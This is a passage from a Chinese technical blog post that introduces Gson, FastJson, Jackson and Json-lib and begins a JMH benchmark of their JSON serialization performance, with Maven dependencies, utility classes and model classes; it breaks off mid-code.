        <content type="html"><![CDATA[<h2 id="Java几种常用JSON库性能比较"><a href="#Java几种常用JSON库性能比较" class="headerlink" title="Java几种常用JSON库性能比较"></a>Java几种常用JSON库性能比较</h2><p>上一篇介绍了Java性能测试框架JMH的使用方法，本篇通过JMH来测试一下Java中几种常见的JSON解析库的性能。 每次都在网上看到别人说什么某某库性能是如何如何的好，碾压其他的库。但是百闻不如一见，只有自己亲手测试过的才是最值得相信的。</p><p>JSON不管是在Web开发还是服务器开发中是相当常见的数据传输格式，一般情况我们对于JSON解析构造的性能并不需要过于关心，除非是在性能要求比较高的系统。</p><p>目前对于Java开源的JSON类库有很多种，下面我们取4个常用的JSON库进行性能测试对比， 同时根据测试结果分析如果根据实际应用场景选择最合适的JSON库。</p><p>这4个JSON类库分别为：Gson，FastJson，Jackson，Json-lib。</p><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>选择一个合适的JSON库要从多个方面进行考虑：</p><ol><li>字符串解析成JSON性能</li><li>字符串解析成JavaBean性能</li><li>JavaBean构造JSON性能</li><li>集合构造JSON性能</li><li>易用性</li></ol><p>先简单介绍下四个类库的身份背景</p><h3 id="Gson"><a href="#Gson" class="headerlink" title="Gson"></a>Gson</h3><p>项目地址：<a href="https://github.com/google/gson">https://github.com/google/gson</a></p><p>Gson是目前功能最全的Json解析神器，Gson当初是为因应Google公司内部需求而由Google自行研发而来，但自从在2008年五月公开发布第一版后已被许多公司或用户应用。 Gson的应用主要为toJson与fromJson两个转换函数，无依赖，不需要例外额外的jar，能够直接跑在JDK上。 在使用这种对象转换之前，需先创建好对象的类型以及其成员才能成功的将JSON字符串成功转换成相对应的对象。 类里面只要有get和set方法，Gson完全可以实现复杂类型的json到bean或bean到json的转换，是JSON解析的神器。</p><h3 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h3><p>项目地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>Fastjson是一个Java语言编写的高性能的JSON处理器,由阿里巴巴公司开发。无依赖，不需要例外额外的jar，能够直接跑在JDK上。 FastJson在复杂类型的Bean转换Json上会出现一些问题，可能会出现引用的类型，导致Json转换出错，需要制定引用。 FastJson采用独创的算法，将parse的速度提升到极致，超过所有json库。</p><h3 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h3><p>项目地址：<a href="https://github.com/FasterXML/jackson">https://github.com/FasterXML/jackson</a></p><p>Jackson是当前用的比较广泛的，用来序列化和反序列化json的Java开源框架。Jackson社区相对比较活跃，更新速度也比较快， 从Github中的统计来看，Jackson是最流行的json解析器之一，Spring MVC的默认json解析器便是Jackson。</p><p>Jackson优点很多：</p><ol><li>Jackson 所依赖的jar包较少，简单易用。</li><li>与其他 Java 的 json 的框架 Gson 等相比，Jackson 解析大的 json 文件速度比较快。</li><li>Jackson 运行时占用内存比较低，性能比较好</li><li>Jackson 有灵活的 API，可以很容易进行扩展和定制。</li></ol><p>目前最新版本是2.9.4，Jackson 的核心模块由三部分组成：</p><ol><li>jackson-core 核心包，提供基于”流模式”解析的相关 API，它包括 JsonPaser 和 JsonGenerator。Jackson 内部实现正是通过高性能的流模式 API 的 JsonGenerator 和 JsonParser 来生成和解析 json。</li><li>jackson-annotations 注解包，提供标准注解功能；</li><li>jackson-databind 数据绑定包，提供基于”对象绑定” 解析的相关 API（ ObjectMapper ）和”树模型” 解析的相关 API（JsonNode）；基于”对象绑定” 解析的 API 和”树模型”解析的 API 依赖基于”流模式”解析的 API。</li></ol><p>为什么Jackson的介绍这么长啊？因为它也是本人的最爱。</p><h3 id="Json-lib"><a href="#Json-lib" class="headerlink" title="Json-lib"></a>Json-lib</h3><p>项目地址：<a href="http://json-lib.sourceforge.net/index.html" target="_blank" rel="noopener">http://json-lib.sourceforge.net/index.html</a></p><p>json-lib最开始的也是应用最广泛的json解析工具，json-lib 不好的地方确实是依赖于很多第三方包，对于复杂类型的转换，json-lib对于json转换成bean还有缺陷， 比如一个类里面会出现另一个类的list或者map集合，json-lib从json到bean的转换就会出现问题。json-lib在功能和性能上面都不能满足现在互联网化的需求。</p><h2 id="编写性能测试"><a href="#编写性能测试" class="headerlink" title="编写性能测试"></a>编写性能测试</h2><p>接下来开始编写这四个库的性能测试代码。</p><h3 id="添加maven依赖"><a href="#添加maven依赖" class="headerlink" title="添加maven依赖"></a>添加maven依赖</h3><p>当然首先是添加四个库的maven依赖，公平起见，我全部使用它们最新的版本：</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!-- Json libs--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>net.sf.json-lib<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>json-lib<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>classifier</span><span class="token punctuation">></span></span>jdk15<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>classifier</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.google.code.gson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>gson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.8.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.46<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-databind<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.fasterxml.jackson.core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jackson-annotations<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.9.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h3 id="四个库的工具类"><a href="#四个库的工具类" class="headerlink" title="四个库的工具类"></a>四个库的工具类</h3><h4 id="FastJsonUtil-java"><a href="#FastJsonUtil-java" class="headerlink" title="FastJsonUtil.java"></a>FastJsonUtil.java</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastJsonUtil</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">bean2Json</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">json2Bean</span><span class="token punctuation">(</span>String jsonStr<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> objClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">,</span> objClass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="GsonUtil-java"><a href="#GsonUtil-java" class="headerlink" title="GsonUtil.java"></a>GsonUtil.java</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GsonUtil</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GsonBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">bean2Json</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">json2Bean</span><span class="token punctuation">(</span>String jsonStr<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> objClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">,</span> objClass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">jsonFormatter</span><span class="token punctuation">(</span>String uglyJsonStr<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Gson gson <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GsonBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setPrettyPrinting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        JsonParser jp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JsonParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        JsonElement je <span class="token operator">=</span> jp<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>uglyJsonStr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> gson<span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>je<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="JacksonUtil-java"><a href="#JacksonUtil-java" class="headerlink" title="JacksonUtil.java"></a>JacksonUtil.java</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JacksonUtil</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> ObjectMapper mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">bean2Json</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> mapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JsonProcessingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">json2Bean</span><span class="token punctuation">(</span>String jsonStr<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> objClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">,</span> objClass<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="JsonLibUtil-java"><a href="#JsonLibUtil-java" class="headerlink" title="JsonLibUtil.java"></a>JsonLibUtil.java</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JsonLibUtil</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">bean2Json</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>        JSONObject jsonObject <span class="token operator">=</span> JSONObject<span class="token punctuation">.</span><span class="token function">fromObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> jsonObject<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">json2Bean</span><span class="token punctuation">(</span>String jsonStr<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span>T<span class="token operator">></span> objClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span> JSONObject<span class="token punctuation">.</span><span class="token function">toBean</span><span class="token punctuation">(</span>JSONObject<span class="token punctuation">.</span><span class="token function">fromObject</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">)</span><span class="token punctuation">,</span> objClass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="准备Model类"><a href="#准备Model类" class="headerlink" title="准备Model类"></a>准备Model类</h3><p>这里我写一个简单的Person类，同时属性有Date、List、Map和自定义的类FullName，最大程度模拟真实场景。</p><h4 id="Person类"><a href="#Person类" class="headerlink" title="Person类"></a>Person类</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> FullName fullName<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">private</span> Date birthday<span class="token punctuation">;</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> hobbies<span class="token punctuation">;</span>    <span class="token keyword">private</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> clothes<span class="token punctuation">;</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>Person<span class="token operator">></span> friends<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> FullName <span class="token function">getFullName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> fullName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFullName</span><span class="token punctuation">(</span>FullName fullName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>fullName <span class="token operator">=</span> fullName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> Date <span class="token function">getBirthday</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> birthday<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBirthday</span><span class="token punctuation">(</span>Date birthday<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>birthday <span class="token operator">=</span> birthday<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span> <span class="token function">getHobbies</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> hobbies<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setHobbies</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> hobbies<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hobbies <span class="token operator">=</span> hobbies<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> <span class="token function">getClothes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> clothes<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setClothes</span><span class="token punctuation">(</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> clothes<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>clothes <span class="token operator">=</span> clothes<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Person<span class="token operator">></span> <span class="token function">getFriends</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> friends<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFriends</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Person<span class="token operator">></span> friends<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>friends <span class="token operator">=</span> friends<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        StringBuilder str <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token string">"Person [name="</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">", fullName="</span> <span class="token operator">+</span> fullName <span class="token operator">+</span> <span class="token string">", age="</span> <span class="token operator">+</span> age                <span class="token operator">+</span> <span class="token string">", birthday="</span> <span class="token operator">+</span> birthday <span class="token operator">+</span> <span class="token string">", hobbies="</span> <span class="token operator">+</span> hobbies                <span class="token operator">+</span> <span class="token string">", clothes="</span> <span class="token operator">+</span> clothes <span class="token operator">+</span> <span class="token string">"]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>friends <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            str<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"Friends:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>Person f <span class="token operator">:</span> friends<span class="token punctuation">)</span> <span class="token punctuation">{</span>                str<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="FullName类"><a href="#FullName类" class="headerlink" title="FullName类"></a>FullName类</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FullName</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String firstName<span class="token punctuation">;</span>    <span class="token keyword">private</span> String middleName<span class="token punctuation">;</span>    <span class="token keyword">private</span> String lastName<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">FullName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">FullName</span><span class="token punctuation">(</span>String firstName<span class="token punctuation">,</span> String middleName<span class="token punctuation">,</span> String lastName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> firstName<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>middleName <span class="token operator">=</span> middleName<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> lastName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getFirstName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> firstName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFirstName</span><span class="token punctuation">(</span>String firstName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> firstName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getMiddleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> middleName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMiddleName</span><span class="token punctuation">(</span>String middleName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>middleName <span class="token operator">=</span> middleName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> lastName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLastName</span><span class="token punctuation">(</span>String lastName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> lastName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"[firstName="</span> <span class="token operator">+</span> firstName <span class="token operator">+</span> <span class="token string">", middleName="</span>                <span class="token operator">+</span> middleName <span class="token operator">+</span> <span class="token string">", lastName="</span> <span class="token operator">+</span> lastName <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="JSON序列化性能基准测试"><a href="#JSON序列化性能基准测试" class="headerlink" title="JSON序列化性能基准测试"></a>JSON序列化性能基准测试</h3><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@BenchmarkMode</span><span class="token punctuation">(</span>Mode<span class="token punctuation">.</span>SingleShotTime<span class="token punctuation">)</span><span class="token annotation punctuation">@OutputTimeUnit</span><span class="token punctuation">(</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">)</span><span class="token annotation punctuation">@State</span><span class="token punctuation">(</span>Scope<span class="token punctuation">.</span>Benchmark<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JsonSerializeBenchmark</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 序列化次数参数     */</span>    <span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"1000"</span><span class="token punctuation">,</span> <span class="token string">"10000"</span><span class="token punctuation">,</span> <span class="token string">"100000"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>    <span class="token keyword">private</span> Person p<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Options opt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OptionsBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span 